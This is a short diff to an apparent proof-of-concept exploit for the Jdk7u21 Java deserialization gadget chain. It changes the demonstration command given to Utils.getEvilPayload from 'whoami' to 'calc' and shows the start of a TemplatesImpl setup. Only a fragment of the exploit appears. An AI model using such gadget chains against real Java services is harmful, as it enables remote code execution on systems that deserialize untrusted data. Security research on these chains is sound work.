@@ -15,7 +15,7 @@ import java.util.Map;
 
 public class Jdk7u21 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("whoami");
+        byte[] bytes = Utils.getEvilPayload("calc");
         TemplatesImpl templates = new TemplatesImpl();
         Utils.setValue(templates ,"_name" ,"xxx");
         Utils.setValue(templates ,"_class" ,null);
